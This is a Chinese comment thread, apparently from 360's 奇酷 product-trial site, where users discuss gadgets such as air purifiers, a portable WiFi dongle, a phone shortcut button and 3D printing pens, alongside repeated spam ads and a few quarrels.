为了全家人的健康，入了
这边环境太需要清新空气了......
内测用户飘过~
秒杀其他净化器啊，大西北就需要这玩意儿
估计马上就要开卖啦。哈哈。期待啊。
智能净化，对新装修的房子，净化效果会如何呢！
为啥我离5米远就没信号了
这玩意千万不能用，那辐射足够杀死你大部分脑细胞！而且一点创意也没有！
每天都在期待，每天都来看，我这颗躁动的心。。。。。。。
谢谢你的提醒，不过不知你有没有查词典或用360搜索下，乐此不疲——因酷爱干某事而不感觉厌烦。形容对某事特别爱好而沉浸其中。褒义
我在公司办公室上班，北方雾霾严重，现在公司领导基本都有安*的空气净化器，价格相对来说较高，对你们这款产品很感兴趣，是因为它的功能比较齐全，有特色，想使用下，希望能有机会试用，谢谢！
什么时候出来啊？我现在很需要一个，手机流量都不够了
什么时候开始卖啊？
看起来很不多，很想买
不错  感谢楼主推荐  正需要呢  果断收藏
路由要是做成这样，更酷！！
快去试用吧 哈哈
啥时能搞来做一轮奇酷试用呢~！！
好像木有人看的样子。。很用心的写的说。。。 求关注。。。呵呵
我是专业做微信公众平台定制开发的，我的个人微信公众平台号“wjm556”欢迎大家的关注。只要你对微信有什么不是很了解的地方，只要你留言，我们都将在第一时间回复。你直接通过手机号15157277028（直接取得联系）同时我公司现在一个角落还在装修，希望能得到你家的产品，同时为你量身定制一个微信公众平台，帮你宣传宣传。
我是专业做微信公众平台定制开发的，我的个人微信公众平台号“wjm556”欢迎大家的关注。只要你对微信有什么不是很了解的地方，只要你留言，我们都将在第一时间回复。你直接通过手机号15157277028（直接取得联系）同时我公司现在一个角落还在装修，希望能得到你家的产品，同时为你量身定制一个微信公众平台，帮你宣传宣传。
我是专业做微信公众平台定制开发的，我的个人微信公众平台号“wjm556”欢迎大家的关注。只要你对微信有什么不是很了解的地方，只要你留言，我们都将在第一时间回复。你直接通过手机号15157277028（直接取得联系）同时我公司现在一个角落还在装修，希望能得到你家的产品，同时为你量身定制一个微信公众平台，帮你宣传宣传。
我是专业做微信公众平台定制开发的，我的个人微信公众平台号“wjm556”欢迎大家的关注。只要你对微信有什么不是很了解的地方，只要你留言，我们都将在第一时间回复。你直接通过手机号15157277028（直接取得联系）同时我公司现在一个角落还在装修，希望能得到你家的产品，同时为你量身定制一个微信公众平台，帮你宣传宣传。
我是专业做微信公众平台定制开发的，我的个人微信公众平台号“wjm556”欢迎大家的关注。只要你对微信有什么不是很了解的地方，只要你留言，我们都将在第一时间回复。你直接通过手机号15157277028（直接取得联系）同时我公司现在一个角落还在装修，希望能得到你家的产品，同时为你量身定制一个微信公众平台，帮你宣传宣传。
我是专业做微信公众平台定制开发的，我的个人微信公众平台号“wjm556”欢迎大家的关注。只要你对微信有什么不是很了解的地方，只要你留言，我们都将在第一时间回复。你直接通过手机号15157277028（直接取得联系）同时我公司现在一个角落还在装修，希望能得到你家的产品，同时为你量身定制一个微信公众平台，帮你宣传宣传。
我是专业做微信公众平台定制开发的，我的个人微信公众平台号“wjm556”欢迎大家的关注。只要你对微信有什么不是很了解的地方，只要你留言，我们都将在第一时间回复。你直接通过手机号15157277028（直接取得联系）同时我公司现在一个角落还在装修，希望能得到你家的产品，同时为你量身定制一个微信公众平台，帮你宣传宣传。
我是专业做微信公众平台定制开发的，我的个人微信公众平台号“wjm556”欢迎大家的关注。只要你对微信有什么不是很了解的地方，只要你留言，我们都将在第一时间回复。你直接通过手机号15157277028（直接取得联系）同时我公司现在一个角落还在装修，希望能得到你家的产品，同时为你量身定制一个微信公众平台，帮你宣传宣传。
我是专业做微信公众平台定制开发的，我的个人微信公众平台号“wjm556”欢迎大家的关注。只要你对微信有什么不是很了解的地方，只要你留言，我们都将在第一时间回复。你直接通过手机号15157277028（直接取得联系）同时我公司现在一个角落还在装修，希望能得到你家的产品，同时为你量身定制一个微信公众平台，帮你宣传宣传。
我是专业做微信公众平台定制开发的，我的个人微信公众平台号“wjm556”欢迎大家的关注。只要你对微信有什么不是很了解的地方，只要你留言，我们都将在第一时间回复。你直接通过手机号15157277028（直接取得联系）同时我公司现在一个角落还在装修，希望能得到你家的产品，同时为你量身定制一个微信公众平台，帮你宣传宣传。 
我是专业做微信公众平台定制开发的，我的个人微信公众平台号“wjm556”欢迎大家的关注。只要你对微信有什么不是很了解的地方，只要你留言，我们都将在第一时间回复。你直接通过手机号15157277028（直接取得联系）同时我公司现在一个角落还在装修，希望能得到你家的产品，同时为你量身定制一个微信公众平台，帮你宣传宣传。 
我是专业做微信公众平台定制开发的，我的个人微信公众平台号“wjm556”欢迎大家的关注。只要你对微信有什么不是很了解的地方，只要你留言，我们都将在第一时间回复。你直接通过手机号15157277028（直接取得联系）同时我公司现在一个角落还在装修，希望能得到你家的产品，同时为你量身定制一个微信公众平台，帮你宣传宣传。 
每天都在期待，每天都来看，我这颗躁动的心。。。。。。。 
大概什么时候开卖给个时间啊 最近正急着换路由器
实在太贵了。。。
我还会继续发的     我们班的人叫我土豪，呵呵呵呵呵呵呵呵呵呵呵呵呵。。。。。。。最后的心得我是在度娘上看的》。。。。。haoba 
4月15日收到奖励通知，22日寄出，24日就收到了，安装试用，App可兼容性，功能应用还是少了些，能代替M2的电源键就好了。另外，能提供快递单号跟进更完美。
为像素在一个把，我做了一个小鞋子，在5.1发 
求教程 啊啊啊 
怎么说现在什么东西广告都是好的  精彩的  但这些都是浮云   好不好体验了才知道    
东西很好，也很漂亮，我也确实需要一个，但不直价格总样？如果价格合适一定买一个
期待中，什么时候出结果呀，今天都4月30日了呀
看起来很厉害的酱紫·····赶脚有科技感！
看起来很牛掰啊，这明显宣传不够啊，我前几天买了个盒子，要是早看到这个就买这个了。
有创意，刚好我喜欢养花花草草，现在家里面都是花花草草的，每次施肥还要去买绿叶宝有机肥
收到了，还是小小的惊喜了一下，不知道是不是手机的问题，单击和双击都存在比较大的时间差，单击还好一点，双击大部分时候基本上不太管用。还有就是放在口袋里面，如果不小心挤压到的话，比较容易挤压到耳机孔里面，不太好弄出来，而且因为这个有些小，比较容易丢失。 其他的因为毕竟是小东西，功能不可能很强大的，一键拍照的功能还是比较实用的。
收到了，挺不错的，支持360！
北京雾霾严重，家里老人，小孩很需要这样的产品！需要清新空气，！期待
已经收到 不过我的手机不是安卓系统 好像不能用哎 如果能够针对其他品牌手机 开发出一些新的应用 很好的 
正好刚刚装修了房子，希望可以有一台啊，我要中了那评测指定杠杠的。
希望得到试用 
这么年轻就当妈妈了~~ 好遗憾.....
教程很详细，车子送我吧！
没不到的效果，有机会请砖家在使用前和使用后都在房间测试了。得出好的报告 ：）
你买的什么盒子啊？好用吗？
一台空气净化器，净化家里面的空气，有了空气净化器，什么颗粒物 硫化物 甲醛 病毒细菌 pm2.5，都不用怕了，把我家里面净化的，干干净净，空气新鲜，有了空气净化器就能身体健康了，不咳嗽不生病降低感冒的风险。
想咨询什么时候开售！！！
我们这里的空气原来是很好的，现在雾霾越来越严重了。真的好想拥有这样一款神器啊。
啊啊啊，为什么每次都木有我啊
配件还可以，断开了会响，就是声音太小。手机端就不行了，经常不响。WP8还得改进很多呀。
又没有T_T
我还是没有
再一次不中奖。。。。空气净化器绝对没戏了。。。
应该是很不错的宝贝 期待 谢谢！！
上面图有亮点，找啊找！
居然已经当妈妈了。。累觉不爱啊~
收到了  我是用xplay3s的目前还不支持  希望早点可以更新   
你们就是贱，每次都选不到你每次都申请
收到了  收到了。。。。。。。。。。。。。很方便的小东西。。。。携带方便。。省流量
好贵呀   ，音质怎么样
电池很不放心那，而且太贵了。
其实已经买过好几个了，同事朋友都被我普及了。这个留着备用！
伟大的母爱，用巧手为可爱的女儿献上了一份别的父母给不了的礼物，大胆可行的运用了身边的耗材实施了一件伟大的创作。真心希望打造出更多的产品，妈妈+U！
这东西看影片清晰不
产品有待进一点完善，成熟时会开卖。==吧
有钱也有权才能发起军事战争，只要是战争都是害人的，在战争中多少有死人。权钱是害人的，更是救人的，关键在谁手？权钱让人死就是害人的，权钱振救爱劳动的人就是救人的！
震动又防水，你们懂得
有游戏系统吗？游戏加手机？
我肿么还没收到。。。
功能强大，随身携带方便。 
哎 只能呵呵了  
哎，只能等下期了。 
哈哈，谢谢你谬赞哦。 我都不用吃饭了，开心饱了呢~
年轻当妈妈恢复的快嘛~
何时出来成品啊？希望价格不要太高。。。。
很不错的游戏产品啊。
真心期待啊！！！！！
嘿嘿，谢谢你的支持哦，也祝你好运呢！
看到开头..23岁，哇，照片，哇，，更哇的是 我已经是一岁女人的麻麻...女儿也相当之可爱啊啊 祝全家幸福 女儿健康成长  赞~~~~~~~
我住武汉，正好刚刚装修了房子，正在考虑要买一台什么牌子的，家里的2台新电视都是TCL的，希望这次活动给力点，申请可以中标！！！
方便实用。设置简单。信号还不错，特别适合在写字楼没有wifi的用户
可以说   送2个给我干嘛 
单天线，有点让人意外啊
这么炫酷。不过看上去电池会是个问题。
全志A31的芯片？A7架构？
这个好炫酷啊
小巧 迷你 超前！空前！生来多彩！
清新器压根没想！已经无爱了！！！
效果非常好，完美支持小米3，很满意
IPHONE4行吗？
360***机W9900 不支持，你们需要更新驱动了
收到货了 绿色的 非常迷你哈哈 感谢奇酷
在获得安慰奖之前已经买过4个了，在出差的时候用着挺方便的。随身wifi的驱动及软件应用，做的挺好挺实用的，而且在不断进步。
家中的小孩确实是需要一个纯净的环境!申请多期了，来一个吧！
希望产品小巧一点，不然瘦子怎么活……
不知道，结实不结实耐摔度和抗风度有多高！
360给我了好高兴
能给我个么我好喜欢
唉！又一次落空了。
期待期待，希望能便宜点啊
中了！中了！中了！
还是没中，信心严重受挫！
我想要啊啊咋啊
很喜欢!!!!!!!!
真能4G，999我都买
真的很好诶，同学看到都想要
快出呀！！急用！！！
艾，又没中！！！！！！！！！！！
谢谢您的关注，产品采用EPP抗摔材料和独特的结构设计，非常耐摔，正常飞行不会撞烂。微型飞机都不抗风，只有10g左右，特别是慢飞侧重于室内飞和室外无风飞行。滑翔机可以在微风中飞行。
在一次的不由自主的点下了申请！
多少錢左右
我花了1440买了一台，不错，我在单位开启和关闭净化气，调节风速和模式，老婆在家里不知道怎么回事，还以为是净化器有问题呢，哈哈
货已收到，绿色的，小巧可爱挺喜欢，由于我是无线网络不能用，留着以后有了光缆再用吧，谢谢奇酷，继续奇酷的活动！
感谢奇酷，继续参加奇酷的活动！
万一手机没电了怎么办？
外观方面不容置疑，但是很容易脏，另外连接笔记本对视频时不稳定。里面的云盘没有自己独立的帐号。
抓拍有时候，颜色不正。在就是手电筒功能，手机没自带手电筒功能，建议官方能提供个手电筒的下载链接。其他的都还好，很不错！！！
第一次申请测评，通过了，计步器已经EMS发货了。我的感觉是，如果只是抱着占便宜的心态来碰运气，确实很难中的，这不是中奖，而是人为审核。机会不会给浑水摸鱼者，原谅我说那么直。至少我自己，花了时间分析过这个产品，然后精简了一段意见附上去的
是真图吗。支持个先。
有点小贵。呵呵
我已经提交了
呵呵，天线可以去除的
垃圾，我都买过了
嘿嘿，注意是安卓哟，哈哈哈
看到它就被吸引住了，我觉得&#039;有了它的话，我的生活环境能有升华啊！
我是做电动车的，这种车型仿制，在市场上的价格，低配可在一千六七以下，甚至更低。高配可在两千二甚至更低。（按至少赚两百块的前提下）
我代理的是全球销量的第一的&quot;逸新&quot;空气净化器这个品牌,需要了解的可以加我的微信或者联系13016441230 或者查看 https://app.yinxiang.com/shard/s14/sh/02d1ce26-4610-4049-bb6a-516c95857ebe/19e791c19cbbaa843c8836b117574c25
我代理的是全球销量的第一的&quot;逸新&quot;空气净化器这个品牌,需要了解的可以加我的微信或者联系13016441230 或者查看 https://app.yinxiang.com/shard/s14/sh/02d1ce26-4610-4049-bb6a-516c95857ebe/19e791c19cbbaa843c8836b117574c25
我代理的是全球销量的第一的&quot;逸新&quot;空气净化器这个品牌,需要了解的可以加我的微信或者联系13016441230 或者查看 https://app.yinxiang.com/shard/s14/sh/02d1ce26-4610-4049-bb6a-516c95857ebe/19e791c19cbbaa843c8836b117574c25i
我代理的是全球销量的第一的&quot;逸新&quot;空气净化器这个品牌,需要了解的可以加我的微信或者联系13016441230 或者查看 https://app.yinxiang.com/shard/s14/sh/02d1ce26-4610-4049-bb6a-516c95857ebe/19e791c19cbbaa843c8836b117574c25iii
我代理的是全球销量的第一的&quot;逸新&quot;空气净化器这个品牌,需要了解的可以加我的微信或者联系13016441230 或者查看 https://app.yinxiang.com/shard/s14/sh/02d1ce26-4610-4049-bb6a-516c95857ebe/19e791c19cbbaa843c8836b117574c25
我代理的是全球销量的第一的&quot;逸新&quot;空气净化器这个品牌,需要了解的可以加我的微信或者联系13016441230 或者查看 https://app.yinxiang.com/shard/s14/sh/02d1ce26-4610-4049-bb6a-516c95857ebe/19e791c19cbbaa843c8836b117574c25
小孩子，诚实一点好，度娘是链接到我的评测上的，你不应该把那段心得删掉吗？
更新之后，为什么没有双击了呢？
好可惜，没中。有点迫切想能拿到哦。
360要是能够针对其他 手机开发一些应用就好了 不要只针对安卓系统 
我的手机不是安卓系统 好像不可以使用哦 能不能开发一些别的系统的手机也可以使用 
10%亮度。。。。。。。。。。
挺好的希望能有用
很好的绿色小清新感觉，360随身wifi随身携带方便，小巧实用，感谢360和奇酷
中不到奖品啊，还不如去逛逛有什么物美价廉的东西啊&#039;&#039;younibao.taobao.com&#039;&#039;
好可爱的说，买不到了啊，还不如去逛逛有什么物美价廉的东西啊&#039;&#039;younibao.taobao.com&#039;&#039;
什么时候发售啊
已经预约了，但是没有消息什么时间开卖。
什么时候发售啊
分辨率才640*480，应该不是很清晰
这个可以，可以***···················
东西是好东西 就是放到兜里总是自己就按下了 还有就是按完智键后屏幕还是黑的 抓拍也得看看效果对吧 我想看的话 还得解锁 很烦啊 还有就是不好往出拔啊 上次往出拔费劲 差点没掉到下水道里 还有就是 只能定义两个功能 可不可以多订一些 比如说 长按 啊 连按啊之类的 我的是小3 不知道这么说能不能行
钢铁侠里面的 
请问在哪里看到发货的？我的不知道发没发货...
很正常！不赚个两三百+的  他家的孩子老婆你养啊
东西收到了，说实话待机锁频后的后台模式，阿里云的没有效果！！
更新之后，为什么没有双击了呢？ 占了耳机位，就多了一个快捷功能，实话说，没看到高科技体现，急需努力吧
哇，谢谢你的祝福哦！
同问！查的到快递单号吗？
便宜的话，倒还真可以搞一个
好像丑了点
998还可以考虑下
哎哟，这大学生有福了
你好！请问发货后在网站上查的到快递单号吗？
好几次的申请还望这次能申请下来
价格在100元之内，就买一个啦！嘻嘻！！
超喜欢，希望有一个就好了，价格希望低一点就好了！！
超喜欢，非常好，希望早点儿出来，想弄一个了！
谁给你说我没手机的  S4出的那个暑假我就买了 我是没办法上传图片 图片太大了好吗  你要是骂人去别的地方骂人  没素质 都说了传不上去  再说了 我没手机这个壳我申请了也没意义好吗 
谁给你说我没手机的 S4出的那个暑假我就买了 我是没办法上传图片 图片太大了好吗 你要是骂人去别的地方骂人 没素质 都说了传不上去 再说了 我没手机这个壳我申请了也没意义好吗
谢谢理解   真讨厌那些骂人的人
  河北秦皇岛  离得比较近的缘故吧
能希望试用一次啊··这次都是帮女朋友滴老妈他们申请的··自己用不用都无所谓了
我有手机 拜托你看下  我说了 我传了好几次 传不上去  能传上去几张我就传了几张  都说了那段时间一直忙考试  自己也不知道能被抽中
申请了几次都没有，
申请了好多次都没有。什么价还是买一个吧
看数据不错。有些新意。价格也比较合理。不知道实际使用的情况如何。
学生穷，为什么这些高科技如此贵·······不是199就是299反正就是99或者88的，几百几千几万，伤不起
绝对彪悍。。
露脸。提高申请成功率
看起来很牛掰啊，这明显宣传不够啊，我前几天买了个盒子，要是早看到这个就买这个了。  
价格在100到200之间肯定买
太给力了好想要
这个产品应该要分辨率再高些才能热卖。
不错哦，东西小巧可爱
同问多少钱
我迫切需要1台作为单位试用，如果满意的话，将订购6—8台，作为招待客人时使用，也是单位一个形象和品位。
一切都会有的，只要坚持。
测试手机：华为荣耀3X。设定：单击home键，双击抓拍，长按锁屏。这三个功能足够了。不足：1 有时单击不反应，希望改进。2 双击拍照照片变形、拉长。3 智键相机开启后图像明显延后，反应迟缓。
你这不是扯犊子吗，淘宝老板看到会告你侵权的！
感谢亲支持！
产品小巧，方便快捷，简单易上手，是个好东西，但对手机安卓系统的要求相对较高，我要换机了。。
坚持就是胜利！
我是三星S4，用着很方便！跟白色的机子很配！使用起来简单快捷，易上手！七项贴心功能，包含：智键相机，闪拍，手机加速，手电筒，录音，Home键和自定义。如果支持iphone就更好啦~
说心里话真的很不错，是一款好产品！但也提出一些建议，提的不对请批评指正！1、按键后反应速度还是慢2、对于一些应用按下打开，再按下不能关闭3、放到口袋中易误操作4、按键的功能太少了，我只能选择一个功能定义，为什么不能有长按功能，短按功能，按两下的三下的功能定义。5、能不能有更多的颜色可以选择6、能不能设置个密码呢，如果丢了别人用不了。7、加点挂饰好吗？别光秃秃的！
呵呵，不错
看起来不错哦，能中吗
太遗憾了，额的手机不是安卓4•0的!但是也特别感谢360团队！
好漂亮   便宜一定买个
这款产品是什么价位
这车一直就这样站着时间长了会很辛苦。。。。只适合很近距离的代步。不是很实用感觉。。。
不会 我没有盗图 那个步骤的图是官网的 不是某宝店主的
感觉不错！
我也是。。。
看看............
好轻的感觉
很不错，想买一个噢
真的很神奇，高科技了，奇酷真的开阔视野了
等好久了  怎么还没有出啊？？ 
你好看到留言请联系我！
厉害…… 佩服
车才1000多，一个灯就700。。。
怎么和拜硕耳机差不多呀
虽然没中，但我毫不犹豫的买了一个，靠，249，希望下次中。。。。。
很希望能申请试用
马来西亚的人要如何买到呢？：？   
-_-看了大家说的价格，冷汗直流啊。。。
希望得到试用   
我手机用不了，按啦没反应！
加长的啊。。。应该不行。。。。我不知道加长的是神马啊。。。
每周五都有的哦~没有的话，可能是系统延时哦~
碰碰运气…………
可惜是iPhone5的
可惜太贵了
最看重价格
那要看看良心了
貌似早就有了。。。taobao有卖的
？？？有何指教
很酷啊应该有市场的   在资料上看到过代步机器人但价格实在是让人撑受不了
我想体验下这重玩法
有没有一个可以消费得起的价！！！！！！！！！！
要安卓4.0才行吗？我的是安卓2.3可以用不？求解
5555 55555555555555555555
希望可以中 
希望可以给我试试
抓拍的照片都是黑的，怎么回事，是不是我操作问题啊
 很期待哦！
这款产品真的介绍的非常好，很期待能有使用他的机会，亲自感受他的创新科技。
多大啊不知道
好像评论过了，不过真心不错
好想试试，期待 
期待试用,希望 ···········
怎么买？？？？？
没有相应配套的手机  怎么办？还不如买小米的呢
..这个屌
这....
能跟智键结合就棒了
不错   所有应用一键搞定
期待试用,希望可以使用到好的产品
东西这么好，怎么还不发售？
期待中~~~~~~~~~
这东西完全就是个鸡肋产品，我发现现在做智能硬件的都是一种饥饿状态，就感觉好像生活中的什么都要把它变复杂，生活中一些东西可以让他变得更加智能，但是有一部分东西遵循的原则是简单！创意就是把复杂变的简单，习惯扔掉旧的东西。。。
我到现在都不知道这个产品的实际意义是什么？如果手机有两个耳机插口，那么我会选择买一个智键！！请以后不要再把这种垃圾放到奇酷上，我想看到真正伟大的东西！
如果想解放双手你完全可以变革手机，这东西解放双手了吗？
希望360以后可以推出一些伟大的作品，真正有变革意义的东西。而非这些四不像，垃圾。
希望大家喜欢我的报告！谢谢！
哟哟~抽中我吧抽中我吧 &gt;&lt;
都呢么久了,&lt;!!!@怎么还不发售!no！no！no！nono!!!
支持一下。
感觉3D打印笔就是搭了3D打印的顺风车，但是把贵的东西阉割一下变便宜就是一种颠覆性创新。
不错 所有应用一键搞定 
写得很用心，做得不错，铁塔作的瘦高一点，就更有感觉了
后壳打不开怎么办
绿色。。。。
力挺360奇虎  搞垮腾讯   加油360奇虎 挺你
1、按键后反应速度还是慢2、对于一些应用按下打开，再按下不能关闭3、放到口袋中易误操作4、按键的功能太少了，我只能选择一个功能定义，为什么不能有长按功能，短按功能，按两下的三下的功能定义。5、不支持插件软件（如360手机卫生的360加速球，360优化大师的一键优化等）
谢谢您的建议，确实很有道理。
谢谢亲！！！！都是些临时的作品，商家有配了两种颜色的材料，但是进出料速度很慢，更换起来比较麻烦，所以就没用紫色的了，想来做出来的话应该也很漂亮！
放在口袋中无意就会触动按键，其他都很好用。
看着轻巧好玩，不错的东东
求给力，奇虎加油。
触摸屏的硬度适用佩戴环境吗？屏幕大的会不会有束缚感
单轮的代步器不贵啊
写得不错,给了一个赞.7期不中表示JD啊!
鸦鸦3D打印笔  济南集罗电子 过年没年终奖不说，工人们1、2月份工资克扣！年假大家都没发钱，休几天扣几天！并且两个月周日全不算工资！！ 姜总您让我们情何以堪！！
鸦鸦3D打印笔  济南集罗电子 过年没年终奖不说，工人们1、2月份工资克扣！年假大家都没发钱，休几天扣几天！并且两个月周日全不算工资！！ 姜总您让我们情何以堪！！海外专利侵权官司赢了吗？！
鸦鸦3D打印笔  济南集罗电子 过年没年终奖不说，工人们1、2月份工资克扣！年假大家都没发钱，休几天扣几天！并且两个月周日全不算工资！！ 姜总您让我们情何以堪！！海外专利侵权官司赢了吗？！你不是自己都说自己产品就是个热熔胶枪吗？！
鸦鸦3D打印笔  济南集罗电子 过年没年终奖不说，工人们1、2月份工资克扣！年假大家都没发钱，休几天扣几天！并且两个月周日全不算工资！！ 姜总您让我们情何以堪！！海外专利侵权官司赢了吗？！
您还是到别处说比较好···
打出来的不错，我都看懂了，哈哈 
盗图可不对 请迅速修改 不然报告会屏蔽处理
什么时候能出啊？》
铁塔很赞 看的出来很用心啊
刘明爽怎么能玩得那么爽…
确实小，但是分辨率太低了，这个价格的便携投影仪都是720P的
便宜点就好了，可以飞的也才2000。。。
谢谢您的认可，这会成为我更大的动力去做好每一份报告。
不错的东西，今天收到，试了一下，从今往后，***则无形，智键则无敌了
看上去是相当的给力喔。
希望价格合理，可以考虑的，不过能不能上路还是交通局说了算啊。
=真有才=真有才=真有才=真有才
写的不错！ Cindy 687步 3层楼
谢谢支持哈
请慢慢期待,就快出来了哦~ing
超级想拥有一台，
我也好想要一个，感觉应该会挺方便的吧，就是不知道待机时间和重量手感怎么样
我喜欢  给我一个吧 我天天飞
感觉应该不是很重，而且给人一种很亲切的感觉，应该挺方便的
不错哦！加油
还是没有很好的解决电池容量的弊端~~ 
绿色的，以前自己买了一个黄色的，最早一个黑色的1代，不错，特别是用手机APP的摇一摇备份，很方便，32个赞！
可以增加一个手表断开（被取下）后，自动联系父母的功能。这样能在坏人发现的同时立刻报警。
这图也是网上自己找的吧。。。
这个梗荣一被砸坏
什么弊端？你的意思是电池容量小了？一般的遥控飞机设计飞行时间都在10分钟左右，这个时间的设计有个考量，就是人一直玩飞机时间长了会疲劳的。一般飞行控制在10分钟以内，休息一会再接着玩，而不是一下子飞行一个钟，这样人受不了的。
鸦鸦3D打印笔 济南集罗电子 过年没年终奖不说，工人们1、2月份工资克扣！年假大家都没发钱，休几天扣几天！并且两个月周日全不算工资！！ 姜总您让我们情何以堪！！
劳动合同都没有！无法证明在那里工作过!我们讨薪者容易吗，都是打工的！流水线工人一共1000多工资，等于给他一个月白干！！去哪里说理？
支持一下 作品很好看
从最开始的内测一代 到内测二代……一直再用………………期待更多玩法出现！
谢谢您的支持O(∩_∩)O~
我要中大家 啊 
支持的系统版本希望是4.3以上
现在挺想要一个移动电源的，可一直没看到想要的……不过挺期待这个的……
不知道支持安卓手机吗 
这套设备用的是什么技术？ZigBee么？
现在空气质量真的很差，如果这一款不错的话，就买三台。
哈哈,良心报告
良心测评报告,赞一个
云悦mini青春版五月五号进行预约，您意想不到的惊喜哟~~~预约网址：http://sale.jd.com/act/QkzZWRmfDvLqI.html
谢谢您的支持哦，祝你好运~~
智键用了一段时间，很方便，比较喜欢拍照功能，很实用，也很隐形，很精致，就是听歌的时候要换下来，一不小心就可能丢了
嘿嘿~谢谢亲的支持~
谢谢支持哦~o(∩_∩)o
这都被你发现了~暗笑···
太假了，全部试用了，奇酷有点那个啊。哎
为奇酷正名下吧，我还真的只是运气好呢。。
感觉有点大，每个人手指的尺寸也是个问题
期待有没有希望
有创意，将传统净化功能与互联网功能链接。且可监控处理效果正不多见，好处也显而易见，希望有机会试用。
什么时候上市，最好三网全能
收到了360公司发来的随身WIFI一只，从外观来讲很小巧，方便随身带，包装上也很精美，但是上手的第一感觉就是，每在一台电脑上用需要安装驱动，这一点如果能优化一下，不用安装其动，或者用自己的USB驱动也行呀，这样更方便，还发现一点，信号上不是很稳定，几米的范围还可以，一间屋子大了，信号上都会减少很多，如果能加强一下信号的发射就好了，因为人不可能一定就坐在一个地方上网吧，有时还得走走之类的，   
 没有呢  好想要哦
能不能说说大概什么时候开始销售啊！
还没开始发售嘛？
能松动挑松紧的那不错。人的大小不同。带上能舒服是最重要的。
内部再加个固定装置应该就能适应大小了。否则真有可能会要出几种型号来适应大家的手指了。
谢谢支持！！
不错的报告
非常适合广告从业的公司，清新的空气脑也灵活！来一台让我试试
不错不错~~期待杰作
哈哈 这哥们说的最后好逗，，，
赞一个～　　很期待。。。。　
你在工作之余想要增加一份收入吗？有意向的话加我扣扣472500255
同事手机屏幕坏了，现在无法关机，只能通过抠电池，当他看到智键时，说了句能不能用智键快捷关机呢，所以不知道智键未来能不能添加“快捷关机”的功能
创意不错的小东西，刚收到时我迫不及待的打开拍照作以留念，赶快下载app，插入智键，但是选择手电筒后，按键一下，不成功。试了好几次，都不成功，后来我把app卸载，插入智键，然后下载app安装，哈哈，能用啦！的确不错，很方便，一键直达，建议360能把智键功能拓展让他有增强手机信号或wifi信号的功能更好，感谢360的攻城狮们，期待产品越来越好！
希望得到使用，很关注这台净化器，空气确实是第一杀手，每时每刻都在吸入
嗯，谢谢您的支持。
造型很酷哦，还可以声控。赞！
在外地临时开会的时候使用，真心不错呢！
很环保的创意哦，真心实用！
这年头用播放器和带手表是一样的，我你觉得更重品质。三角的形状不错哦，有个性！
又出神器了，赞！期待上市！
不错啊，很完美的试用，希望能够看到你更多的试用报告
很有创意。但不知效果如何？真相试一试。
飞机可以悬停不？头向上爬升姿势那种。
我怎么觉得楼主期期都中。我是期期都不中捏？原来我的运气这差嘞，我真是悲催呀~奇酷快来发现我呀，也让我中个呀哈哈。
款式不够美观
房门关上的话效果不怎么样，希望这方面能加强一下穿透力
手一甩会不会飞出去啊
good job!!
外形大气时尚，很想拥有一台，超赞的！
您说的是吊机，只有3d机才能吊机，手机遥控做不了的
评测写的很好，就是人长得不咋滴
你个垃圾，我就说，你丫不服
感觉有点像大片里面的那种操作手。
如果这个产品实际使用效果能达到宣传中的70%，我就会考虑采购
伟大的母爱
兄弟你家的家电真多。。。。
太赞了。大奇。牢记你了。
超赞的零式飞机！！！文字大爱~~~··`·`
貌似没有iOS客户端？
堵塞修理过程很详细，在香港买的3doole就这样子弄好了，谢谢分享！还有，模型做得很棒，一点都不粗略!
方便，实用，信号质量满好的，就是穿透不是很好，设置很方便。
谢谢。。。。
有用就好。。
居然打出了一个能实用的小玩意
13年那些评论的都是托吧
小巧方便，灵活运用。分享快乐，分享资源。我觉得这是它得主题。 产品总体没得说，大家都很了解。WIFI信号还凑合吧，可以穿1-2道我家的墙。 驱动和应用更新速度很快。
智能店铺安防系统更实用些。但是家庭的好像范围更广些，用量更大，希望能有好的创意更加防盗、防火等
有了这东西就好，假冒伪劣将离我们越来越远了，希望功能不虚啊
它属于音乐发烧友的东西哈哈
怎么每次都有你啊？
要能无线充电 和定位就好了  给小孩用
内存有点。。。
好希望中一次
....不错
大家都是循序渐进的学习3D打印笔的用法啊。越做越帅啊。赞
很不错。期待有更好的作品。
给了很多优缺点的对比啊。赞。
谢谢支持..
造型不错！！等着吧。
外形非常炫酷啊。喜欢。
很贴心的报告，喜欢这类型的。
这个白色的用在你的手机上还挺漂亮的啊。
good idea。。。
很不错的指环哦，大爱！
很智能的手环哦，造型也很酷！
嘿嘿，父母给的长相，我很满足啦~
谢谢您的支持哦~
第二次呢，第一次是3D打印笔~也祝你好运哦~
够酷的造型哦，还如此省电。适合车内使用。期待实际性能是否可靠！
够创意的产品，既是装饰又很实用，虽然融入了光触媒、负离子，但我觉得这样的产品还是不要太在意性能的对比了。有个性，能打动你这就足够了？
终于收到了已是一星期了，无力吐槽EMS，是安全绿哦，我一向是360忠实粉，希望下次还有我的奖品哦……
智能家庭安防系统，不错的卖点！小小的家确实需要精心的呵护，这样的产品确实很有市场。如此全面、操作方便，并且专攻实时监控的系统让人心动的同时，不由得让我想到那不亲民的价格。自嘲一下，俺陋室请不起这样的大佛哦！
创意有时并不全是新技术的革新，虽然喜欢小葱拌豆腐的清新，但有时尝尝一锅烩也是不错的选择。就如这个卷纸座，不正是让平凡变得有趣吗！家务之余既可听音乐又不怕手机没电。贴心的设计往往就是这么让人舒心。避风的小屋需要温暖的神器，快把它领回家吧！
马上母亲节了，给母亲一个礼物 
我爱你呀，奇库！谢谢你，又出新东西。我爱你！！！！！
为啥不能买
当食品危机在中国蔓延的时候，救赎者终于横空出世。是他,是他,就是他。我们的朋友小SCiO，有内涵的小家伙真的很实用。通过第三方应用，他可以运用到我们生活的各个方面，让不良卖家颤抖吧！
good idea好主意
加油加油~祝你好运哦！
续航能力，期待……
东西不错，实用，轻巧，但取下来就容易丢掉，还有就是安装时要小心，不能按压到按键，否则又要重新安装。
外形很酷，很好看
老半天不发售，急屎人了
又落空了，好伤心
好酷，有钱了想买一个
看着不错，就是不知道功能和体验怎么样，好期待呀
免费的东西从不光顾我！
等到别人炒糊了再拿出来吗
3000元有体验快感、不知性价比怎么样、可以联网和朋友网友对战就好了
可以卖我会先买一台试试、如果好的话办个证开个店自己挣钱当老板
免费试用 总有小伙伴们能拿到试用名额！
大气时尚，很想拥有一台，超赞的. 
大气时尚，很想拥有一台，超赞的. 
1、建议数据化说明省电和功能的实用性，有效性；2、触摸屏的使用寿命及产品的效果能否让消费者得到意外的满意？3、清理后的灰尘等可否进行无害化处理？
360还做这样的产品？
